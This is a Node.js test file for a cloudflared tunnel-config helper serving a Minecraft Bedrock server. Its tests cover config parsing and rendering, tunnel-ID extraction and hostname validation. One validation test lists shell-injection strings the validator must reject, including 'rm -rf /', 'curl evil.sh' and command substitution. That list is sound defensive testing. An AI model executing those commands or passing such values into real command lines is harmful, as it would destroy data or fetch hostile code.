'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const CF = require('../lib/cloudflared');

const PORT = 19132;   // Bedrock, UDP

const OURS = `tunnel: 8f1c9e64-1111-2222-3333-444455556666
credentials-file: /home/u/.cloudflared/8f1c9e64-1111-2222-3333-444455556666.json

ingress:
  - hostname: mc.example.com
    service: udp://localhost:19132
  - service: http_status:404

metrics: 127.0.0.1:0
`;

// ─── Reading a config ─────────────────────────────────────────────────────

test('parseTunnelConfig reads a config this app wrote', () => {
  const cfg = CF.parseTunnelConfig(OURS, PORT);
  assert.strictEqual(cfg.hostname, 'mc.example.com');
  assert.strictEqual(cfg.tunnel, '8f1c9e64-1111-2222-3333-444455556666');
  assert.strictEqual(cfg.configured, true);
});

test('parseTunnelConfig reads an entry with the keys in the other order', () => {
  // Valid YAML that cloudflared honours. The shipped build looked only at the
  // line ABOVE the service line, so this read as "no tunnel configured" and
  // the app offered to create a second tunnel over a working one.
  const cfg = CF.parseTunnelConfig(`tunnel: abc
ingress:
  - service: udp://localhost:19132
    hostname: mc.example.com
  - service: http_status:404
`, PORT);
  assert.strictEqual(cfg.hostname, 'mc.example.com');
  assert.strictEqual(cfg.configured, true);
});

test('parseTunnelConfig ignores comments and quotes on the hostname', () => {
  const cfg = CF.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: "mc.example.com"   # the n8n editor
    service: udp://localhost:19132
  - service: http_status:404
`, PORT);
  assert.strictEqual(cfg.hostname, 'mc.example.com');
});

test('parseTunnelConfig picks the entry pointing at OUR port', () => {
  const cfg = CF.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: grafana.example.com
    service: http://localhost:3000
  - hostname: mc.example.com
    service: udp://localhost:19132
  - service: http_status:404
`, PORT);
  assert.strictEqual(cfg.hostname, 'mc.example.com',
    'a shared cloudflared config must not hand back another app hostname');
});

test('parseTunnelConfig accepts 127.0.0.1 as the same service as localhost', () => {
  const cfg = CF.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: mc.example.com
    service: udp://127.0.0.1:19132
  - service: http_status:404
`, PORT);
  assert.strictEqual(cfg.hostname, 'mc.example.com');
});

test('parseTunnelConfig reports not-configured instead of throwing on junk', () => {
  for (const input of ['', null, undefined, '\t\n', 'this is not yaml at all', 'ingress:\n  - \n']) {
    const cfg = CF.parseTunnelConfig(input, PORT);
    assert.strictEqual(cfg.configured, false);
    assert.strictEqual(cfg.hostname, null);
  }
});

test('parseTunnelConfig requires both a tunnel id and a hostname', () => {
  // A hostname with no tunnel id cannot be run; an id with no hostname routes
  // nothing. Neither is "configured".
  assert.strictEqual(CF.parseTunnelConfig(`ingress:
  - hostname: mc.example.com
    service: udp://localhost:19132
`, PORT).configured, false);
  assert.strictEqual(CF.parseTunnelConfig('tunnel: abc\n', PORT).configured, false);
});

// ─── Writing a config ─────────────────────────────────────────────────────

test('renderTunnelConfig round-trips through the parser', () => {
  const yaml = CF.renderTunnelConfig({
    tunnelId: 'abc-123', credentialsFile: '/c/abc-123.json', hostname: 'mc.example.com', port: PORT,
  });
  const cfg = CF.parseTunnelConfig(yaml, PORT);
  assert.strictEqual(cfg.hostname, 'mc.example.com');
  assert.strictEqual(cfg.tunnel, 'abc-123');
  assert.strictEqual(cfg.configured, true);
});

test('renderTunnelConfig always ends the ingress list with the catch-all', () => {
  // cloudflared refuses to start a config whose ingress has no final catch-all.
  const yaml = CF.renderTunnelConfig({
    tunnelId: 'x', credentialsFile: '/c/x.json', hostname: 'h.example.com', port: PORT,
  });
  assert.ok(yaml.includes(`service: ${CF.CLOUDFLARED_SERVICE_404}`));
  const cfg = CF.parseTunnelConfig(yaml, PORT);
  assert.strictEqual(cfg.ingress[cfg.ingress.length - 1].service, CF.CLOUDFLARED_SERVICE_404);
});

test('renderTunnelConfig refuses to write a config that cannot work', () => {
  assert.throws(() => CF.renderTunnelConfig({ credentialsFile: '/c', hostname: 'h.example.com', port: PORT }));
  assert.throws(() => CF.renderTunnelConfig({ tunnelId: 'x', credentialsFile: '/c', port: PORT }));
});

// ─── Tunnel id ────────────────────────────────────────────────────────────

test('parseTunnelId extracts the UUID cloudflared reports', () => {
  const out = 'Created tunnel mentat with id 8f1c9e64-1111-2222-3333-444455556666';
  assert.strictEqual(CF.parseTunnelId(out), '8f1c9e64-1111-2222-3333-444455556666');
  assert.strictEqual(CF.parseTunnelId('something went wrong'), null);
  assert.strictEqual(CF.parseTunnelId(''), null);
});

// ─── Hostname validation ──────────────────────────────────────────────────
// This value reaches a command line and a generated config file.

test('isValidHostname accepts real hostnames', () => {
  for (const h of ['mc.example.com', 'a.b.c.example.co.uk', 'mc-1.example.com']) {
    assert.strictEqual(CF.isValidHostname(h), true, h);
  }
});

test('isValidHostname rejects shell metacharacters and injection attempts', () => {
  for (const h of [
    'mc.example.com; rm -rf /',
    'mc.example.com && curl evil.sh',
    '$(whoami).example.com',
    'a`id`.example.com',
    'mc.example.com | tee /tmp/x',
    'host name.example.com',
  ]) {
    assert.strictEqual(CF.isValidHostname(h), false, h);
  }
});

test('isValidHostname rejects malformed names', () => {
  for (const h of ['', '   ', 'localhost', 'mc.example.com.', '-bad.example.com', 'a'.repeat(300), null, 42]) {
    assert.strictEqual(CF.isValidHostname(h), false, String(h));
  }
});

// ─── Connection detection ─────────────────────────────────────────────────

test('isTunnelConnectedLine only fires on the edge registration line', () => {
  assert.strictEqual(CF.isTunnelConnectedLine('INF Registered tunnel connection connIndex=0'), true);
  assert.strictEqual(CF.isTunnelConnectedLine('INF Starting tunnel'), false);
  assert.strictEqual(CF.isTunnelConnectedLine(undefined), false);
});

// ─── The scheme is load-bearing for Bedrock ───────────────────────────────

test('renderTunnelConfig writes a udp service by default', () => {
  const yaml = CF.renderTunnelConfig({
    tunnelId: 'x', credentialsFile: '/c/x.json', hostname: 'mc.example.com', port: PORT,
  });
  assert.ok(yaml.includes(`service: udp://localhost:${PORT}`),
    'an http:// ingress produces a tunnel that connects and accepts no players');
});

test('an http ingress on the Bedrock port is not mistaken for a configured tunnel', () => {
  const cfg = CF.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: mc.example.com
    service: http://localhost:19132
  - service: http_status:404
`, PORT);
  assert.strictEqual(cfg.configured, false, 'wrong scheme means the tunnel cannot carry the game');
});
